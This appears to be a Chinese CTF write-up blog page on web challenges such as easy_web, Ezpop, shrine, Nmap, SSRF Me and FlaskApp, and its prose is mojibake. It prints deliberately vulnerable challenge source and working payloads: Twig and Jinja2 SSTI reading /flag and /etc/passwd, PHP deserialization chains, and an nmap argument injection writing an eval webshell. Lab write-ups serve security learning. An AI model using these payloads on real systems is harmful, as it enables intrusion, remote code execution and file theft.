<h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</p>
<p>è§‚å¯Ÿurl éšæ³¢é€æµè§£ä¸å‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">echo (base64_decode(&#x27;MzUzNTM1MmU3MDZlNjc=&#x27;));</span><br></pre></td></tr></table></figure>

<p>ä¸¤æ¬¡ï¼Œå†hex 16è¿›åˆ¶è§£å¯†</p>
<p>å¾—åˆ°555.phpï¼ŒåŒæ ·åŠ å¯†hou</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€æŸ¥çœ‹æºç </p>
<p>baseè§£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;]))     header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123;    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;    die(&quot;xixiï½ no flag&quot;);&#125; else &#123;    $txt = base64_encode(file_get_contents($file));    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;        echo `$cmd`;    &#125; else &#123;        echo (&quot;md5 is funny ~&quot;);    &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt;  body&#123;   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>æŠ“åŒ…flag.phpçš„åŒ…</p>
<p>ã€‚<a href="https://so.csdn.net/so/search?q=SSTI&spm=1001.2101.3001.7020">SSTI</a>é‡Œé¢çš„Twigæ”»å‡»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¾“å…¥&#123;&#123;7*â€˜7â€™&#125;&#125;ï¼Œè¿”å›49è¡¨ç¤ºæ˜¯ Twig æ¨¡å—</span><br><span class="line">è¾“å…¥&#123;&#123;7*â€˜7â€™&#125;&#125;ï¼Œè¿”å›7777777è¡¨ç¤ºæ˜¯ Jinja2 æ¨¡å—</span><br></pre></td></tr></table></figure>

<p>cookieæ”¹ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=c8cde75f12c03656af33c984478d1870; user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;tac /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å®‰æ´µæ¯-2019-easy-serialize-phpæœªå†™"><a href="#å®‰æ´µæ¯-2019-easy-serialize-phpæœªå†™" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_phpæœªå†™"></a>[å®‰æ´µæ¯ 2019]easy_serialize_phpæœªå†™</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function = @$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125;else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125;else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;source=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;source-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)));</span><br></pre></td></tr></table></figure>

<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>åªå…è®¸ä¸€ä¸ªå­—ç¬¦ï¼Œä½¿ç”¨unicode</p>
<p>payload</p>
<p>id:4   â†‚</p>
<p>åœ¨ä¸‹é¢è¿™ä¸ªç½‘ç«™ä¸Šæœç´¢<code>ten thousand</code>:</p>
<p><a href="https://www.compart.com/en/unicode/U+2182">â€œâ†‚â€ U+2182 Roman Numeral Ten Thousand Unicode Character (compart.com)</a></p>
<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">        return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br><span class="line"></span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†config,selif,ä¸”è¿‡æ»¤äº†æ‹¬å·</p>
<p>å¦‚æœæ²¡æœ‰è¿‡æ»¤å¯ä»¥ç›´æ¥å³å¯æŸ¥çœ‹æ‰€æœ‰app.configå†…å®¹</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>flagåœ¨phpinfo()é‡Œ;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a=&#x27;phpinfo()&#x27;;</span><br><span class="line">    public $b=&#x27;eval&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new HelloPhp();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; &lt;?= @eval($_POST[1]);?&gt; -oG a.phtml &#x27;</span><br></pre></td></tr></table></figure>

<p>è¿æ¥æŸ¥çœ‹æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">require(&#x27;settings.php&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set_time_limit(0);</span><br><span class="line">if (isset($_POST[&#x27;host&#x27;])):</span><br><span class="line">	if (!defined(&#x27;WEB_SCANS&#x27;)) &#123;</span><br><span class="line">        	die(&#x27;Web scans disabled&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$host = $_POST[&#x27;host&#x27;];</span><br><span class="line">	if(stripos($host,&#x27;php&#x27;)!==false)&#123;</span><br><span class="line">		die(&quot;Hacker...&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	$host = escapeshellarg($host);</span><br><span class="line">	$host = escapeshellcmd($host);</span><br><span class="line"></span><br><span class="line">	$filename = substr(md5(time() . rand(1, 10)), 0, 5);</span><br><span class="line">	$command = &quot;nmap &quot;. NMAP_ARGS . &quot; -oX &quot; . RESULTS_PATH . $filename . &quot; &quot; . $host;</span><br><span class="line">	$result_scan = shell_exec($command);</span><br><span class="line">	if (is_null($result_scan)) &#123;</span><br><span class="line">		die(&#x27;Something went wrong&#x27;);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		header(&#x27;Location: result.php?f=&#x27; . $filename);</span><br><span class="line">	&#125;</span><br><span class="line">else:</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>escapeshellcmd()</strong> å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> æˆ– <a href="https://www.php.net/manual/zh/function.system.php">system()</a> å‡½æ•°ï¼Œæˆ–è€… <a href="https://www.php.net/manual/zh/language.operators.execution.php">æ‰§è¡Œæ“ä½œç¬¦</a> ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚</p>
<p>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š<code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`ã€<code>\x0A</code> å’Œ <code>\xFF</code>ã€‚ <code>&#39;</code> å’Œ <code>&quot;</code> ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ <code>%</code> å’Œ <code>!</code> å­—ç¬¦å‰é¢éƒ½æœ‰ä¸€ä¸ªæ’å…¥ç¬¦å·ï¼ˆ<code>^</code>ï¼‰</p>
<p><strong>escapeshellarg()</strong> å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ä¹‰ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å«<a href="https://www.php.net/manual/zh/function.exec.php">exec()</a>ã€<a href="https://www.php.net/manual/zh/function.system.php">system()</a> å’Œ<a href="https://www.php.net/manual/zh/language.operators.execution.php">æ‰§è¡Œè¿ç®—ç¬¦</a> ã€‚</p>
<p>åœ¨ Windows ä¸Šï¼Œ<strong>escapeshellarg()</strong> ç”¨ç©ºæ ¼æ›¿æ¢äº†ç™¾åˆ†å·ã€æ„Ÿå¹å·ï¼ˆå»¶è¿Ÿå˜é‡æ›¿æ¢ï¼‰å’ŒåŒå¼•å·ï¼Œå¹¶åœ¨å­—ç¬¦ä¸²ä¸¤è¾¹åŠ ä¸ŠåŒå¼•å·ã€‚æ­¤å¤–ï¼Œæ¯æ¡è¿ç»­çš„åæ–œçº¿(<code>\</code>)éƒ½ä¼šè¢«ä¸€ä¸ªé¢å¤–çš„åæ–œçº¿æ‰€è½¬ä¹‰ã€‚</p>
<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>ä¸‹è½½æºç ï¼Œè¿›è¡Œå®¡è®¡å­¦ä¹ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">#encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&#x27;latin1&#x27;)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&#x27;code&#x27;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#x27;data&#x27;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;)</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">                result[&#x27;data&#x27;] = f.read()</span><br><span class="line">            if result[&#x27;code&#x27;] == 500:</span><br><span class="line">                result[&#x27;data&#x27;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#x27;code&#x27;] = 500</span><br><span class="line">            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.</span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>pinç ä¸»è¦æ˜¯åˆ6ä¸ªå‚æ•°æ„æˆ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flaskæ‰€ç™»å½•çš„ç”¨æˆ·å</span><br><span class="line">modnameï¼Œä¸€èˆ¬æ˜¯flask.app</span><br><span class="line">getattr(app, â€œnameâ€, app.class.name)ã€‚ä¸€èˆ¬ä¸ºFlask</span><br><span class="line">flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„ã€‚è¿™ä¸ªå¯ä»¥ç”±æŠ¥é”™ä¿¡æ¯çœ‹å‡º</span><br><span class="line">å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°ã€‚</span><br><span class="line">æœºå™¨çš„idã€‚</span><br></pre></td></tr></table></figure>

<p>4 getattr(mode,â€<strong>file</strong>â€œ,None)  app.py æ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡æŠ¥é”™æ‹¿åˆ°ï¼Œå¦‚ä¼ å‚çš„æ—¶å€™ç»™ä¸ªä¸å­˜åœ¨çš„å˜é‡</p>
<p>5 str(uuid.getnode())   ç”µè„‘ä¸Šçš„mac åœ°å€åè¿›åˆ¶,ä»»æ„æ–‡ä»¶è¯» <code>/sys/class/net/eth0/address</code></p>
<p>(1)è·å–ç”¨æˆ·åusername</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import getpass</span><br><span class="line">username=getpass.getuser()</span><br><span class="line">print(username)</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆusername</p>
<p>(2)</p>
<p>è·å–appå¯¹è±¡nameå±æ€§</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getattrï¼ˆapp,&quot;__name__&quot;,type(app).__name__)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">app=Flask(__name__)</span><br><span class="line">print(getattr(app,&quot;_name__&quot;,type(app).__name__))</span><br><span class="line">è·å–çš„æ˜¯å½“å‰appå¯¹è±¡çš„__name__å±æ€§</span><br><span class="line">è‹¥ä¸å­˜åœ¨åˆ™è·å–ç±»çš„__name__å±æ€§ï¼Œé»˜è®¤ä¸ºFlask</span><br></pre></td></tr></table></figure>

<p>1<strong>flaskæ‰€ç™»å½•çš„ç”¨æˆ·å</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flaskweb:x:1000:1000::/home/flaskweb:/bin/sh</span><br></pre></td></tr></table></figure>

<p>ä¸ºflaskweb</p>
<p><strong>modname ä¸€èˆ¬ä¸å˜å°±æ˜¯flask.app</strong></p>
